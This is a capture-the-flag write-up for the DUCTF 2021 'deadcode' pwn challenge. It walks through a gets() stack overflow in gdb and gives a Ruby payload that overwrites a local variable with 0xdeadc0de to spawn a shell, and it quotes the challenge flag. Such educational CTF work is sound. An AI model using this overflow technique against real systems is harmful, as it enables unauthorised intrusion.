## Intro
**deadcode** was a pwn challenge at DUCTF 2021.  

You were given a binary to exploit.

## Investigation
`checksec` showed that besides NX no other stack mitigations are present. Following the `ltrace` I learned the relatively simple flow of the program and found a
potential buffer overflow vulnerability because the insecure `gets` functions is used to capture user input. I loaded the program into `gdb` and disassembled
the `main` function, which is the only one as `info functions` showed.

```
...
0x00000000004011c7 <+50>:   lea    rax,[rbp-0x20]
0x00000000004011cb <+54>:   mov    rdi,rax
0x00000000004011ce <+57>:   mov    eax,0x0
0x00000000004011d3 <+62>:   call   0x401060 <gets@plt>
0x00000000004011d8 <+67>:   mov    eax,0xdeadc0de
0x00000000004011dd <+72>:   cmp    QWORD PTR [rbp-0x8],rax
0x00000000004011e1 <+76>:   jne    0x401200 <main+107>
...
0x00000000004011ef <+90>:   lea    rdi,[rip+0xed5]        # 0x4020cb  "/bin/sh"
0x00000000004011f6 <+97>:   mov    eax,0x0
0x00000000004011fb <+102>:  call   0x401050 <system@plt>
...
```
We can see here that whatever resides at `rbp-0x8` is compared to `0xdeadc0de` and if equals, `system("/bin/sh")` is executed. So the goal is to overflow
the buffer at `rbp-0x20` and write `0xdeadc0de` to `rbp-0x8` - which initially is set to `0` - to spawn us a shell. Let's set a breakpoint right before the compare and run the program
with `AAAAAAAA` as input.  

```
(gdb) r
...
Breakpoint 1, 0x00000000004011d8 in main ()
(gdb) x/8x $rbp-0x20
0x7fffffffdec0:	0x41414141	0x41414141	0x00401000	0x00000000
0x7fffffffded0:	0xffffdfd0	0x00007fff	0x00000000	0x00000000
(gdb) p $rbp-0x8
$3 = (void *) 0x7fffffffded8
```

So we have to overwrite the contents of address `0x7fffffffded8` (thats's where `rbp-0x8` points to). The `AAAAAAAA`'s we typed in were sent straight to the buffer at
`0x7fffffffdec0` (that's where `rbp-0x20` points to) as we can see by the eight `0x41`'s (ASCII value for 'A'). From here we learn we have to fill the buffer
with 24 bytes and then get to write `0xdeadc0de` to our target address.  

## Solution
Let's pull off a quick ruby exploit for proof of concept.

```
(gdb) r <<< $(ruby -e 'print "A"*24 + "\xde\xc0\xad\xde"')
...
Breakpoint 1, 0x00000000004011d8 in main ()
(gdb) x/8x $rbp-0x20
0x7fffffffdec0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffded0:	0x41414141	0x41414141	0xdeadc0de	0x00000000
(gdb) x/x $rbp-0x8
0x7fffffffded8:	0xdeadc0de
(gdb) c
Continuing.


Maybe this code isn't so dead...
```

... and we've successfully overflowed the buffer satisfying the compare to get our shell. From here we can just execute `cat flag.txt`
to get the flag.

See [exploit](./exploit.py) for an automation of the exploit written in python.  

> DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}

